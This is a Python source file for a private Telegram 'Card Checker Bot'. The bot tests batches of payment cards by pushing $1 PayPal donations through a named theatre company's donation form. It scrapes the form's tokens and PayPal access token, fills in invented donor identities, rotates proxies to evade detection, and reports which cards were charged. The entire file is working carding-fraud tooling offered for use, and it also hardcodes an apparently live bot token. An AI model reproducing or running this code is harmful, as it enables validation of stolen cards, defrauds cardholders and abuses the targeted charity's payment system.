import asyncio
import base64
import random
import re
from dataclasses import dataclass
from typing import Any, Dict, Optional, Tuple, List
from datetime import datetime
import os

import httpx
from faker import Faker
from requests_toolbelt.multipart import MultipartEncoder
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters


# ==================== Configuration ====================
BOT_TOKEN = "8207958853:AAGx9Te8ZBMI8h-z7RrWqVwWz3dxq_BPCbM"
AUTHORIZED_USER_ID = 1427023555


# ==================== Proxy Manager ====================
class ProxyManager:
    def __init__(self, storage_file="proxies.txt"):
        self.proxies: List[str] = []
        self.current_index = 0
        self.storage_file = storage_file
        self._load_proxies()
    
    def _load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists(self.storage_file):
                with open(self.storage_file, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
        except Exception:
            pass
    
    def _save_proxies(self):
        """Save proxies to file"""
        try:
            with open(self.storage_file, 'w') as f:
                for proxy in self.proxies:
                    f.write(f"{proxy}\n")
        except Exception:
            pass
    
    def add_proxy(self, proxy: str):
        """Add a single proxy"""
        if proxy and proxy not in self.proxies:
            self.proxies.append(proxy.strip())
            self._save_proxies()
            return True
        return False
    
    def add_proxies_from_list(self, proxy_list: List[str]):
        """Add multiple proxies from list"""
        added = 0
        for proxy in proxy_list:
            if proxy and proxy.strip() not in self.proxies:
                self.proxies.append(proxy.strip())
                added += 1
        if added > 0:
            self._save_proxies()
        return added
    
    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        return self._format_proxy(proxy)
    
    def _format_proxy(self, proxy: str) -> str:
        """Format proxy to httpx format"""
        # Input format: username:password@host:port
        # Output format: http://username:password@host:port
        if proxy.startswith('http://') or proxy.startswith('https://'):
            return proxy
        return f"http://{proxy}"
    
    def clear_proxies(self):
        """Clear all proxies"""
        self.proxies.clear()
        self.current_index = 0
        self._save_proxies()
    
    def get_proxy_count(self) -> int:
        """Get total number of proxies"""
        return len(self.proxies)
    
    def remove_proxy(self, index: int) -> bool:
        """Remove proxy by index (0-based)"""
        if 0 <= index < len(self.proxies):
            self.proxies.pop(index)
            if self.current_index >= len(self.proxies) and self.proxies:
                self.current_index = 0
            self._save_proxies()
            return True
        return False
    
    def get_proxy_by_index(self, index: int) -> Optional[str]:
        """Get proxy by index"""
        if 0 <= index < len(self.proxies):
            return self.proxies[index]
        return None
    
    def get_current_proxy_info(self) -> str:
        """Get current proxy info for display"""
        if not self.proxies:
            return "No proxy"
        return f"Proxy {self.current_index + 1}/{len(self.proxies)}"


# ==================== Authorization Decorator ====================
def authorized_only(func):
    """Decorator to check if user is authorized"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != AUTHORIZED_USER_ID:
            if update.message:
                await update.message.reply_text("⛔ Unauthorized access. This bot is private.")
            return
        return await func(update, context)
    return wrapper


# ==================== PayPal Checker Core ====================

@dataclass(frozen=True)
class _Config:
    base_url: str = "https://atlanticcitytheatrecompany.com"
    donation_path: str = "/donations/donate/"
    ajax_endpoint: str = "/wp-admin/admin-ajax.php"
    proxy_template: Optional[str] = None
    timeout: float = 90.0
    retries: int = 5


class _SessionFactory:
    __slots__ = ("_cfg", "_faker")

    def __init__(self, cfg: _Config, faker: Faker):
        self._cfg = cfg
        self._faker = faker

    async def _probe_proxy(self, proxy: Optional[str]) -> Optional[httpx.AsyncClient]:
        client = httpx.AsyncClient(
            timeout=self._cfg.timeout,
            proxies=proxy,
            transport=httpx.AsyncHTTPTransport(retries=1)
        )
        try:
            resp = await client.get("https://api.ipify.org?format=json", timeout=15)
            resp.raise_for_status()
            return client
        except Exception:
            await client.aclose()
            return None

    async def build(self) -> Optional[httpx.AsyncClient]:
        if not self._cfg.proxy_template:
            return httpx.AsyncClient(timeout=self._cfg.timeout)

        for _ in range(self._cfg.retries):
            client = await self._probe_proxy(self._cfg.proxy_template)
            if client:
                return client
        return None


@dataclass(frozen=True)
class _FormContext:
    hash: str
    prefix: str
    form_id: str
    access_token: str


class _DonationFacade:
    __slots__ = ("_client", "_cfg", "_faker", "_ctx")

    def __init__(self, client: httpx.AsyncClient, cfg: _Config, faker: Faker):
        self._client = client
        self._cfg = cfg
        self._faker = faker
        self._ctx: Optional[_FormContext] = None

    async def _fetch_initial_page(self) -> str:
        url = f"{self._cfg.base_url}{self._cfg.donation_path}"
        resp = await self._client.get(url, headers={
            'authority': 'atlanticcitytheatrecompany.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-TN;q=0.8,ar;q=0.7,tr-TR;q=0.6,tr;q=0.5',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        })
        resp.raise_for_status()
        return resp.text

    def _extract_context(self, html: str) -> _FormContext:
        hash_ = self._re_search(r'name="give-form-hash" value="(.*?)"', html)
        prefix = self._re_search(r'name="give-form-id-prefix" value="(.*?)"', html)
        form_id = self._re_search(r'name="give-form-id" value="(.*?)"', html)
        enc_token = self._re_search(r'"data-client-token":"(.*?)"', html)
        dec = base64.b64decode(enc_token).decode('utf-8')
        access_token = self._re_search(r'"accessToken":"(.*?)"', dec)
        return _FormContext(hash_, prefix, form_id, access_token)

    @staticmethod
    def _re_search(pattern: str, text: str) -> str:
        match = re.search(pattern, text)
        if not match:
            raise ValueError(f"Pattern not found: {pattern}")
        return match.group(1)

    async def _init_context(self) -> None:
        html = await self._fetch_initial_page()
        self._ctx = self._extract_context(html)

    def _generate_profile(self) -> Dict[str, str]:
        first = self._faker.first_name()
        last = self._faker.last_name()
        num = random.randint(100, 999)
        return {
            "first_name": first,
            "last_name": last,
            "email": f"{first.lower()}{last.lower()}{num}@gmail.com",
            "address1": self._faker.street_address(),
            "address2": f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1, 999)}",
            "city": self._faker.city(),
            "state": self._faker.state_abbr(),
            "zip": self._faker.zipcode(),
            "card_name": f"{first} {last}",
        }

    def _build_base_multipart(self, profile: Dict[str, str], amount: str) -> MultipartEncoder:
        fields = {
            "give-honeypot": "",
            "give-form-id-prefix": self._ctx.prefix,
            "give-form-id": self._ctx.form_id,
            "give-form-title": "",
            "give-current-url": f"{self._cfg.base_url}{self._cfg.donation_path}",
            "give-form-url": f"{self._cfg.base_url}{self._cfg.donation_path}",
            "give-form-minimum": amount,
            "give-form-maximum": "999999.99",
            "give-form-hash": self._ctx.hash,
            "give-price-id": "custom",
            "give-amount": amount,
            "give_stripe_payment_method": "",
            "payment-mode": "paypal-commerce",
            "give_first": profile["first_name"],
            "give_last": profile["last_name"],
            "give_email": profile["email"],
            "give_comment": "",
            "card_name": profile["card_name"],
            "card_exp_month": "",
            "card_exp_year": "",
            "billing_country": "US",
            "card_address": profile["address1"],
            "card_address_2": profile["address2"],
            "card_city": profile["city"],
            "card_state": profile["state"],
            "card_zip": profile["zip"],
            "give-gateway": "paypal-commerce",
        }
        return MultipartEncoder(fields)

    async def _create_order(self, profile: Dict[str, str], amount: str) -> str:
        multipart = self._build_base_multipart(profile, amount)
        resp = await self._client.post(
            f"{self._cfg.base_url}{self._cfg.ajax_endpoint}",
            params={"action": "give_paypal_commerce_create_order"},
            data=multipart.to_string(),
            headers={"Content-Type": multipart.content_type},
        )
        resp.raise_for_status()
        return resp.json()["data"]["id"]

    async def _confirm_payment(self, order_id: str, card: Tuple[str, str, str, str]) -> httpx.Response:
        n, m, y, cvv = card
        # Support both 2-digit (27) and 4-digit (2027) year formats
        if len(y) == 2:
            y = y
        else:
            y = y[-2:]
        payload = {
            "payment_source": {
                "card": {
                    "number": n,
                    "expiry": f"20{y}-{m.zfill(2)}",
                    "security_code": cvv,
                    "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}},
                }
            },
            "application_context": {"vault": False},
        }
        headers = {
            "Authorization": f"Bearer {self._ctx.access_token}",
            "Content-Type": "application/json",
        }
        return await self._client.post(
            f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            json=payload,
            headers=headers,
        )

    async def _approve_order(self, order_id: str, profile: Dict[str, str], amount: str) -> Dict[str, Any]:
        multipart = self._build_base_multipart(profile, amount)
        resp = await self._client.post(
            f"{self._cfg.base_url}{self._cfg.ajax_endpoint}",
            params={"action": "give_paypal_commerce_approve_order", "order": order_id},
            data=multipart.to_string(),
            headers={"Content-Type": multipart.content_type},
        )
        resp.raise_for_status()
        return resp.json()

    async def execute(self, raw_card: str, amount: str = "1") -> str:
        if not self._ctx:
            await self._init_context()

        card = tuple(raw_card.split("|"))
        if len(card) != 4:
            return "Invalid Card Format"

        profile = self._generate_profile()
        
        try:
            # Step 1: Create order
            order_id = await self._create_order(profile, amount)
            
            # Step 2: Confirm payment with card
            confirm_response = await self._confirm_payment(order_id, card)
            
            # Step 3: Approve order and get final result
            result = await self._approve_order(order_id, profile, amount)
            
            # Parse and return result
            return self._parse_result(result, amount)
        except Exception as e:
            return f"Payment Failed: {str(e)[:50]}"

    @staticmethod
    def _parse_result(data: Dict[str, Any], amount: str) -> str:
        # Check if payment was truly successful (must have success=True)
        # This means the $1 was actually charged
        if isinstance(data, dict) and data.get("success") is True:
            # Double check: if success is True, payment was completed
            return f"Charged - ${amount} !"
        
        # If we reach here, payment was NOT successful
        # Parse the error/decline message
        text = str(data)
        status = "Declined"
        
        try:
            if "'data': {'error': ' " in text:
                status = text.split("'data': {'error': ' ")[1].split('.')[0]
            elif "'details': [{'issue': '" in text:
                status = text.split("'details': [{'issue': '")[1].split("'")[0]
            elif "issuer is not certified. " in text:
                status = text.split("issuer is not certified. ")[1].split('.')[0]
            elif "system is unavailable.  " in text:
                status = text.split("system is unavailable. ")[1].split('.')[0]
            elif "C does not match. " in text:
                status = text.split("not match. ")[1].split('.')[0]
            elif "service is not supported. " in text:
                status = text.split("service is not supported. ")[1].split('.')[0]
            elif "'data': {'error': '" in text:
                status = text.split("'data': {'error': '")[1].split('.')[0]
            elif "'success': False" in text or '"success": false' in text:
                status = "Payment Not Approved"
        except:
            status = "Unknown Error"
        
        sta = status.replace(' ', '').replace('_', ' ').title()
        return sta


class PayPalCvvProcessor:
    __slots__ = ("_cfg", "_faker", "_session_factory", "_proxy_manager")

    def __init__(self, proxy_manager: ProxyManager):
        self._proxy_manager = proxy_manager
        self._cfg = _Config()
        self._faker = Faker("en_US")
        self._session_factory = None

    async def _run_single(self, card: str) -> str:
        # Get next proxy from rotation
        proxy = self._proxy_manager.get_next_proxy()
        
        # Create config with proxy
        cfg = _Config(proxy_template=proxy)
        session_factory = _SessionFactory(cfg, self._faker)
        
        client = await session_factory.build()
        if not client:
            return "Proxy/Session Init Failed"

        facade = _DonationFacade(client, cfg, self._faker)
        try:
            return await facade.execute(card)
        except Exception as e:
            return f"Runtime Error: {str(e)[:50]}"
        finally:
            await client.aclose()

    async def process(self, card: str, attempts: int = 3) -> str:
        for attempt in range(1, attempts + 1):
            try:
                return await self._run_single(card)
            except Exception:
                if attempt == attempts:
                    return "Tries Reached Error"
        return "Logic Flow Error"


# ==================== Telegram Bot ====================

class CheckerStats:
    def __init__(self):
        self.charged = 0
        self.declined = 0
        self.total = 0
        self.total_cards_to_check = 0  # Total cards in current batch
        self.is_running = False
        self.start_time = None
        self.current_card = None
        self.current_status = "Idle"  # Idle, Checking, Approved, Declined

    def reset(self):
        self.charged = 0
        self.declined = 0
        self.total = 0
        self.is_running = False
        self.start_time = None
        self.current_card = None

    def increment_charged(self):
        self.charged += 1
        self.total += 1

    def increment_declined(self):
        self.declined += 1
        self.total += 1


# Global instances
stats = CheckerStats()
proxy_manager = ProxyManager()
processor = PayPalCvvProcessor(proxy_manager)
dashboard_message_id = None
live_dashboard_message_id = None  # For live updating dashboard during checking
checking_task = None


def get_dashboard_text():
    """Generate dashboard text in English"""
    status = "🟢 Running" if stats.is_running else "🔴 Stopped"
    
    elapsed = ""
    if stats.start_time:
        delta = datetime.now() - stats.start_time
        hours, remainder = divmod(int(delta.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        elapsed = f"\n⏱ Time: {hours:02d}:{minutes:02d}:{seconds:02d}"
    
    current = f"\n📍 Current: {stats.current_card[:20]}..." if stats.current_card else ""
    
    proxy_info = f"\n🌐 Proxies: {proxy_manager.get_proxy_count()}"
    if proxy_manager.get_proxy_count() > 0:
        proxy_info += f" ({proxy_manager.get_current_proxy_info()})"
    
    return f"""
╔═══════════════════════════╗
║   💳 CARD CHECKER BOT   ║
╚═══════════════════════════╝

📊 STATUS: {status}

🔥 Charged: [{stats.charged}]
❌ Declined: [{stats.declined}]
💀 Total: [{stats.total}]{proxy_info}{elapsed}{current}

━━━━━━━━━━━━━━━━━━━━━━━━━━
"""


def get_dashboard_keyboard(is_running=False):
    """Generate inline keyboard for dashboard"""
    if is_running:
        buttons = [[InlineKeyboardButton("⏹ STOP", callback_data="stop")]]
    else:
        buttons = [
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
            [InlineKeyboardButton("🗑 Reset Stats", callback_data="reset")]
        ]
    return InlineKeyboardMarkup(buttons)


@authorized_only
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_text = """
👋 Welcome to Card Checker Bot!

📋 Available Commands:
• /start - Show this message
• /dashboard - Show live statistics dashboard
• /check <card> - Check single card
• /mass <cards> - Check multiple cards

🌐 Proxy Management:
• /proxy <proxy> - Add single proxy
• /proxies - Show all saved proxies
• /removeproxy <number> - Remove specific proxy
• /clearproxy - Clear all proxies

⏱️ Control:
• /1 - Stop current checking process

📏 Card Format: 
5589660007409807|05|27|508

🌐 Proxy Format:
username:password@host:port
Example: user:pass@proxy.com:9001

📁 File Upload:
• Send .txt file with cards
• Send .txt file with proxies

💾 Proxies are saved automatically!
⏱️ Fixed delay: 5 seconds between cards

🚀 Ready to start!
"""
    await update.message.reply_text(welcome_text)


@authorized_only
async def dashboard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dashboard command"""
    global dashboard_message_id
    
    message = await update.message.reply_text(
        get_dashboard_text(),
        reply_markup=get_dashboard_keyboard(stats.is_running)
    )
    dashboard_message_id = message.message_id
    context.user_data['dashboard_chat_id'] = update.effective_chat.id


async def update_dashboard(context: ContextTypes.DEFAULT_TYPE):
    """Update dashboard message"""
    global dashboard_message_id
    
    if dashboard_message_id and 'dashboard_chat_id' in context.user_data:
        try:
            await context.bot.edit_message_text(
                chat_id=context.user_data['dashboard_chat_id'],
                message_id=dashboard_message_id,
                text=get_dashboard_text(),
                reply_markup=get_dashboard_keyboard(stats.is_running)
            )
        except Exception:
            pass


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    
    # Check authorization
    if query.from_user.id != AUTHORIZED_USER_ID:
        await query.answer("⛔ Unauthorized!", show_alert=True)
        return
    
    await query.answer()
    
    if query.data == "refresh":
        await query.edit_message_text(
            text=get_dashboard_text(),
            reply_markup=get_dashboard_keyboard(stats.is_running)
        )
    
    elif query.data == "reset":
        stats.reset()
        await query.edit_message_text(
            text=get_dashboard_text() + "\n✅ Stats reset successfully!",
            reply_markup=get_dashboard_keyboard(stats.is_running)
        )
    
    elif query.data == "stop":
        global checking_task
        if checking_task:
            checking_task.cancel()
            checking_task = None
        stats.is_running = False
        await query.edit_message_text(
            text=get_dashboard_text() + "\n⏹ Checking stopped!",
            reply_markup=get_dashboard_keyboard(stats.is_running)
        )


@authorized_only
async def add_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /proxy command to add single proxy"""
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /proxy username:password@host:port\n"
            "Example: /proxy gSWUaLhJhOvHcR7K:wifi;us;;;@proxy.soax.com:9001"
        )
        return
    
    proxy = context.args[0].strip()
    if proxy_manager.add_proxy(proxy):
        await update.message.reply_text(
            f"✅ Proxy added successfully!\n"
            f"🌐 Total proxies: {proxy_manager.get_proxy_count()}"
        )
        await update_dashboard(context)
    else:
        await update.message.reply_text("❌ Proxy already exists or invalid format!")


@authorized_only
async def show_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /proxies command to show proxy info"""
    count = proxy_manager.get_proxy_count()
    if count == 0:
        await update.message.reply_text("ℹ️ No proxies saved.\n\nUse /proxy to add one!")
        return
    
    response = f"🌐 **Saved Proxies** ({count} total)\n\n"
    response += f"📍 Current: {proxy_manager.get_current_proxy_info()}\n\n"
    
    for i, proxy in enumerate(proxy_manager.proxies, 1):
        # Hide password for security
        if '@' in proxy:
            user_pass, host_port = proxy.split('@')
            display_proxy = f"***@{host_port}"
        else:
            display_proxy = proxy
        response += f"`{i}.` {display_proxy}\n"
    
    response += f"\n💡 Use `/removeproxy <number>` to delete\nExample: `/removeproxy 1`"
    
    await update.message.reply_text(response, parse_mode='Markdown')


@authorized_only
async def remove_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /removeproxy command to remove specific proxy"""
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /removeproxy <number>\n"
            "Example: /removeproxy 1\n\n"
            "Use /proxies to see proxy numbers"
        )
        return
    
    try:
        index = int(context.args[0]) - 1  # Convert to 0-based index
        
        if index < 0:
            await update.message.reply_text("❌ Number must be positive!")
            return
        
        proxy = proxy_manager.get_proxy_by_index(index)
        if not proxy:
            await update.message.reply_text(
                f"❌ Proxy #{index + 1} not found!\n\n"
                f"Total proxies: {proxy_manager.get_proxy_count()}\n"
                f"Use /proxies to see all proxies"
            )
            return
        
        # Hide password in confirmation
        if '@' in proxy:
            display_proxy = f"***@{proxy.split('@')[1]}"
        else:
            display_proxy = proxy
        
        if proxy_manager.remove_proxy(index):
            await update.message.reply_text(
                f"✅ Proxy removed!\n\n"
                f"🗑️ Removed: `{display_proxy}`\n"
                f"🌐 Remaining: {proxy_manager.get_proxy_count()} proxies",
                parse_mode='Markdown'
            )
            await update_dashboard(context)
        else:
            await update.message.reply_text("❌ Failed to remove proxy!")
    
    except ValueError:
        await update.message.reply_text("❌ Invalid number! Use: /removeproxy 1")


@authorized_only
async def clear_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /clearproxy command to clear all proxies"""
    count = proxy_manager.get_proxy_count()
    if count == 0:
        await update.message.reply_text("ℹ️ No proxies to clear!")
        return
    
    proxy_manager.clear_proxies()
    await update.message.reply_text(f"✅ Cleared all {count} proxies!")
    await update_dashboard(context)


@authorized_only
async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /check command for single card"""
    if not context.args:
        await update.message.reply_text("❌ Usage: /check 5589660007409807|05|27|508")
        return
    
    card = context.args[0].strip()
    if card.count("|") != 3:
        await update.message.reply_text("❌ Invalid card format! Use: number|month|year|cvv\nExample: 5589660007409807|05|27|508")
        return
    
    stats.is_running = True
    stats.current_card = card
    stats.start_time = datetime.now()
    
    await update.message.reply_text(f"🔄 Checking card...\n`{card}`", parse_mode='Markdown')
    await update_dashboard(context)
    
    result = await processor.process(card)
    
    # Only consider it charged if the exact success message is present
    is_charged = result.startswith("Charged - $") and "!" in result
    
    if is_charged:
        stats.increment_charged()
        response = f"✅ **CHARGED** 🔥\n\n"
        response += f"💳 Card: `{card}`\n"
        response += f"📊 Response: **{result}**\n"
        response += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n"
        response += f"━━━━━━━━━━━━━━━━━━━━━━"
    else:
        stats.increment_declined()
        response = f"❌ **DECLINED**\n\n"
        response += f"💳 Card: `{card}`\n"
        response += f"📊 Response: {result}\n"
    
    await update.message.reply_text(response, parse_mode='Markdown')
    
    stats.is_running = False
    stats.current_card = None
    await update_dashboard(context)


@authorized_only
async def check_mass_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mass command for multiple cards"""
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /mass\n"
            "Then send cards (one per line):\n"
            "5589660007409807|05|27|508\n"
            "5589660007409808|06|28|123"
        )
        return
    
    # Get cards from message
    cards_text = update.message.text.replace('/mass', '').strip()
    cards = [line.strip() for line in cards_text.split('\n') if line.strip() and '|' in line]
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found!")
        return
    
    await process_cards_list(update, context, cards)


@authorized_only
async def stop_command_1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /1 command to stop checking"""
    global checking_task
    
    if stats.is_running:
        stats.is_running = False
        if checking_task:
            checking_task.cancel()
            checking_task = None
        await update.message.reply_text("⏹ Checking process stopped!")
        await update_dashboard(context)
    else:
        await update.message.reply_text("ℹ️ No checking process is running.")


@authorized_only
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    await stop_command_1(update, context)


@authorized_only
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads"""
    document = update.message.document
    
    # Check if it's a text file
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file!")
        return
    
    await update.message.reply_text("📥 Downloading file...")
    
    # Download the file
    file = await context.bot.get_file(document.file_id)
    file_path = f"/tmp/{document.file_name}"
    await file.download_to_drive(file_path)
    
    # Read file content
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
        
        # Clean up
        os.remove(file_path)
        
        if not lines:
            await update.message.reply_text("❌ File is empty!")
            return
        
        # Check if it's cards or proxies
        first_line = lines[0]
        
        if '@' in first_line and ':' in first_line:
            # It's a proxy file
            added = proxy_manager.add_proxies_from_list(lines)
            await update.message.reply_text(
                f"✅ Added {added} proxies!\n"
                f"🌐 Total proxies: {proxy_manager.get_proxy_count()}"
            )
            await update_dashboard(context)
        elif '|' in first_line:
            # It's a cards file
            cards = [line for line in lines if '|' in line]
            if not cards:
                await update.message.reply_text("❌ No valid cards found in file!")
                return
            
            await update.message.reply_text(f"✅ Found {len(cards)} cards in file!\n🚀 Starting check...")
            await process_cards_list(update, context, cards)
        else:
            await update.message.reply_text("❌ Unknown file format! Send cards or proxies file.")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)}")


async def process_cards_list(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    """Process a list of cards"""
    if proxy_manager.get_proxy_count() == 0:
        await update.message.reply_text(
            "⚠️ Warning: No proxies configured!\n"
            "Checking without proxy...\n"
            "Use /proxy to add proxies for better performance."
        )
    
    stats.is_running = True
    stats.start_time = datetime.now()
    
    await update_dashboard(context)
    
    for i, card in enumerate(cards, 1):
        if not stats.is_running:
            await update.message.reply_text("⏹ Checking stopped by user!")
            break
        
        stats.current_card = card
        await update_dashboard(context)
        
        result = await processor.process(card)
        
        # Only consider it charged if the exact success message is present
        is_charged = result.startswith("Charged - $") and "!" in result
        
        if is_charged:
            stats.increment_charged()
            response = f"✅ **CHARGED** 🔥 [{i}/{len(cards)}]\n\n"
            response += f"💳 Card: `{card}`\n"
            response += f"📊 Response: **{result}**\n"
            response += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n"
            response += f"━━━━━━━━━━━━━━━━━━━━━━"
            await update.message.reply_text(response, parse_mode='Markdown')
        else:
            stats.increment_declined()
        
        await update_dashboard(context)
        
        # Add delay between cards (except for the last one)
        if i < len(cards) and stats.is_running:
            await asyncio.sleep(5)  # Fixed 5 seconds delay
    
    stats.is_running = False
    stats.current_card = None
    await update_dashboard(context)
    
    await update.message.reply_text(
        f"✅ Mass check completed!\n\n"
        f"🔥 Charged: {stats.charged}\n"
        f"❌ Declined: {stats.declined}\n"
        f"💀 Total: {stats.total}"
    )


def main():
    """Start the bot"""
    print("🤖 Starting Telegram Card Checker Bot with Proxy Support...")
    print(f"🔐 Authorized User ID: {AUTHORIZED_USER_ID}")
    print(f"🔑 Bot Token: {BOT_TOKEN[:20]}...")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("dashboard", dashboard_command))
    application.add_handler(CommandHandler("check", check_single_card))
    application.add_handler(CommandHandler("mass", check_mass_cards))
    application.add_handler(CommandHandler("proxy", add_proxy_command))
    application.add_handler(CommandHandler("proxies", show_proxies_command))
    application.add_handler(CommandHandler("removeproxy", remove_proxy_command))
    application.add_handler(CommandHandler("clearproxy", clear_proxies_command))
    application.add_handler(CommandHandler("1", stop_command_1))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    print("✅ Bot started successfully!")
    print("🔗 Open Telegram and send /start to your bot")
    print("🌐 Proxy rotation enabled!")
    print("💾 Proxies are saved automatically!")
    print("📁 You can send .txt files with cards or proxies!")
    print("⏱️ Fixed delay: 5 seconds between each card")
    print("⏹ Press Ctrl+C to stop the bot\n")
    
    # Start bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
